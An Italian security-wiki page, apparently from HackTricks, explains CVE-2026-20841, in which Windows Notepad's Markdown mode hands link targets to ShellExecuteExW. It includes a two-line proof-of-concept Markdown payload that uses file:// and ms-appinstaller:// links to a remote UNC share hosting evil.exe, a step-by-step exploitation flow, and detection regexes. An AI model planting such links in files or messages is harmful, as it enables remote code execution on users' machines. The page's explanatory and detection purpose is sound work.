# Windows Protocol Handler / Abuso di ShellExecute (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Le applicazioni Windows che eseguono il rendering di Markdown o HTML possono passare i target selezionati a `ShellExecuteExW`. Poiché ShellExecute esegue il dispatch degli URI scheme registrati e delle associazioni di file, un renderer deve utilizzare una allowlist esplicita invece di presumere che ogni link sia HTTP(S). Il comportamento di Notepad descritto di seguito riguarda CVE-2026-20841 e non dovrebbe essere generalizzato a ogni renderer.<sup>[[1]](#references)[[3]](#references)</sup>

## Superficie di `ShellExecuteExW` nella modalità Markdown di Windows Notepad
- Notepad seleziona la modalità Markdown **solo per le estensioni `.md`** tramite un confronto di stringhe fisso in `sub_1400ED5D0()`.<sup>[[1]](#references)</sup>
- Link Markdown supportati:
- Standard: `[text](target)`
- Autolink: `<target>` (renderizzato come `[target](target)`), quindi entrambe le sintassi sono rilevanti per payload e rilevamenti.
- I clic sui link vengono elaborati in `sub_140170F60()`, che esegue un filtraggio debole e quindi chiama `ShellExecuteExW`.
- `ShellExecuteExW` esegue il dispatch verso **qualsiasi protocol handler configurato**, non solo HTTP(S).<sup>[[1]](#references)</sup>

### Considerazioni sui payload
- Qualsiasi sequenza `\\` nel link viene **normalizzata in `\`** prima di `ShellExecuteExW`, influenzando la creazione e il rilevamento di UNC/path.
- I file `.md` **non sono associati a Notepad per impostazione predefinita**; la vittima deve comunque aprire il file in Notepad e fare clic sul link, ma una volta eseguito il rendering, il link è selezionabile.
- Esempi di scheme pericolosi:<sup>[[1]](#references)</sup>
- `file://` per avviare un payload locale/UNC.
- `ms-appinstaller://` per attivare i flussi di App Installer. Anche altri scheme registrati localmente possono essere abusabili.

### PoC Markdown minimo
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Flusso di exploitation
1. Crea un file **`.md`** in modo che Notepad lo visualizzi come Markdown.
2. Inserisci un link usando uno schema URI pericoloso (`file:`, `ms-appinstaller:` o qualsiasi handler installato).
3. Consegna il file (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB o simili) e convinci l’utente ad aprirlo in Notepad.
4. Al clic, il **link normalizzato** viene passato a `ShellExecuteExW` e il protocol handler corrispondente esegue il contenuto indicato nel contesto dell’utente.<sup>[[1]](#references)[[2]](#references)</sup>

## Idee per il rilevamento
- Monitora i trasferimenti di file `.md` sulle porte/protocolli comunemente usati per la consegna di documenti: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Analizza i link Markdown (standard e autolink) e cerca `file:` o `ms-appinstaller:` **senza distinzione tra maiuscole e minuscole**.
- Espressioni regolari indicate dal vendor per intercettare l’accesso a risorse remote:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- La correzione del vendor descritta da ZDI limita le destinazioni accettate ai file locali e a HTTP(S). Estendi le rilevazioni agli altri protocol handler installati, se necessario, perché la superficie di attacco registrata varia a seconda del sistema.<sup>[[1]](#references)</sup>

## References
- [1] [CVE-2026-20841: Esecuzione arbitraria di codice in Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [2] [PoC di CVE-2026-20841](https://github.com/BTtea/CVE-2026-20841-PoC)
- [3] [Microsoft Learn — `ShellExecuteExW`](https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecuteexw)
{{#include ../banners/hacktricks-training.md}}
